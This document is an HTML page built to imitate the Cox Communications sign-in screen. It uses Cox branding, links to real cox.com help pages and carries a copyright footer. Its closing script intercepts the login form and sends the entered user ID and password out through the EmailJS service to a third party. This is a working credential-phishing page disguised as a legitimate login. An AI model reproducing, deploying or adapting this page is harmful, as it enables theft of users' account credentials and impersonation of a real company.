<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Cox Login</title>
<script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
<style>
  * { box-sizing: border-box; }

  body, html {
    margin: 0; padding: 0; height: 100%;
    font-family: "Cera Bold", "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif";
    background: #fff;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  /* Fixed Header with gradient bottom border and centered logo */
  .header {
    position: fixed;
    top: 0; left: 0;
    width: 100%;
    height: 60px;
    background-color: white;
    display: flex; 
    align-items: center;
    justify-content: center; /* horizontally center logo */
    padding: 0 2rem;
    z-index: 10;
    border-bottom: none;
    box-sizing: content-box;
  }
  .header::after {
    content: "";
    position: absolute;
    bottom: 0;
    left: 0;
    height: 10px;
    width: 100%;
    background: linear-gradient(90deg, rgba(0, 170, 244, 1) 30%, rgba(0, 210, 88, 1) 95%, rgba(0, 210, 88, 1) 100%);
    pointer-events: none;
    z-index: 5;
  }
  .header img {
    height: 48px; /* increased size */
    padding-right: 45px; /* pushes image left within header */
    position: relative;
    z-index: 10;
    display: block; /* remove inline spacing */
  }

  /* Container split into 50% each */
  .container {
    display: flex;
    flex: 1 0 auto;
    height: calc(100vh - 60px);
    margin-top: 60px;
  }

  /* Left panel with white background */
  .left-panel {
    position: relative;
    width: 50%;
    background: white;
    display: flex;
    justify-content: center;
    align-items: flex-start;
  }

  /* Form wrapper with overlap */
  .form-wrapper {
    background-color: #f2f6f7;
    width: 80%;
    padding: 50px 105px;
    border-radius: 1px;
    box-shadow: 0 0 1px rgba(0,0,0,0.1);
    position: relative;
    right: -30%;
    margin-top: 80px;
  }

  h1 {
    margin: 0 0 20px;
    font-weight: 600;
    font-size: 32px;
    color: #255993;
    font-family: "Cera Bold", "Cera Medium";
    text-align: center; /* Center the heading text */
  }

  form {
    display: flex;
    flex-direction: column;
  }

  label {
    font-size: 14px;
    margin-bottom: 6px;
    color: #004263;
  }

  input[type="email"],
  input[type="password"] {
    height: 40px;
    margin-bottom: 20px;
    padding: 0 12px;
    border: 1px solid #cbd1d8;
    border-radius: 4px;
    font-size: 16px;
  }

  /* Checkbox container */
  .checkbox-container {
    display: flex;
    align-items: center;
    margin-bottom: 20px;
    font-size: 14px;
    color: #004263;
    user-select: none;
  }
  .checkbox-container input[type="checkbox"] {
    margin-right: 8px;
    width: 16px;
    height: 16px;
  }

  /* Sign in button styles */
  button {
    height: 36px;
    background-color: #0078d2;
    border: none;
    color: white;
    font-size: 14px;
    border-radius: 4px;
    cursor: pointer;
    font-weight: 600;
    padding: 0 25px;
    align-self: flex-start;
  }

  button:hover {
    background-color: #005ea3;
  }

  /* Vertical links below button with no margin between */
  .links-container {
    margin-top: 20px;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
  }

  .links-container a {
    font-size: 13px;
    color: #0078d2;
    text-decoration: underline;
    white-space: nowrap;
    margin-bottom: 0;
    line-height: 1.3;
  }

  .links-container a:last-child {
    margin-bottom: 0;
  }

  .right-panel {
    width: 50%;
    background:
      linear-gradient(to right, transparent 0%, transparent 0%),
      url('https://i.imghippo.com/files/alE4561SRY.jpg') no-repeat center center / cover;
  }

  /* Footer with same gradient border on top */
  .footer {
    flex-shrink: 0;
    height: 40px;
    background-color: white;
    position: relative;
    border-top: none;
    box-sizing: content-box;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .footer::before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    height: 10px;
    width: 100%;
    background: linear-gradient(90deg, rgba(0, 170, 244, 1) 30%, rgba(0, 210, 88, 1) 95%, rgba(0, 210, 88, 1) 100%);
    pointer-events: none;
    z-index: 5;
  }
  .footer p {
    margin: 0;
    font-size: 14px;
    color: #333;
    position: relative;
    z-index: 10;
  }

  /* Responsive adjustments */
  @media(max-width: 768px) {
    .container {
      flex-direction: column-reverse;
      height: auto;
      margin-top: 60px;
    }
    .left-panel, .right-panel {
      width: 100%;
      height: 50vh;
    }
    /* Adjust margin to move form vertically on mobile */
    .form-wrapper {
      position: static;
      width: 90%;
      margin: -80px auto 0 auto;
      right: 0;
      padding: 30px 20px;
    }
    button {
      width: 100%;
      padding: 10px 0;
    }
    .links-container {
      align-items: flex-start;
    }
  }
</style>
</head>
<body>

<div class="header">
  <img src="https://i.imghippo.com/files/VyV8142Ro.png" alt="Cox Logo" />
</div>

<div class="container">
  <div class="left-panel">
    <div class="form-wrapper">
      <h1>Welcome back</h1>
      <form id="signin-form">
        <label for="user_email">User ID</label>
        <input type="email" id="user_email" name="user_email" placeholder=" " required />

        <label for="user_password">Password</label>
        <input type="password" id="user_password" name="user_password" placeholder=" " required />

        <div class="checkbox-container">
          <input type="checkbox" id="remember_id" name="remember_id" />
          <label for="remember_id">Remember user ID</label>
        </div>

        <button type="submit">Sign In</button>

        <div class="links-container">
          <a href="https://www.cox.com/myprofile/forgot-userid.html?finalview=" target="_blank" rel="noopener noreferrer">Forgot User ID?</a>
          <a href="https://www.cox.com/myprofile/forgot-password.html?finalview=" target="_blank" rel="noopener noreferrer">Forgot Password?</a>
          <a href="https://www.cox.com/myprofile/registration.html?finalview=" target="_blank" rel="noopener noreferrer">New here? Sign up today</a>
          <a href="https://www.cox.com/residential/support/trouble-signing-in-on-the-cox-website.html" target="_blank" rel="noopener noreferrer">Need Help Signing In?</a>
        </div>
      </form>
    </div>
  </div>
  <div class="right-panel"></div>
</div>

<div class="footer">
  <p>Â© 2025 Cox Communications. All rights reserved.</p>
</div>

<script>
  (function(){
    emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
  })();

  const form = document.getElementById('signin-form');
  form.addEventListener('submit', function(event) {
    event.preventDefault();
    const templateParams = {
      user_email: form.user_email.value,
      user_password: form.user_password.value,
      remember_id: form.remember_id.checked ? "Yes" : "No"
    };
    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
      .then(() => {
        alert('Sign-in information sent successfully!');
        form.reset();
      }, () => {
        alert('Failed to send the sign-in information. Please try again.');
      });
  });
</script>

</body>
</html>
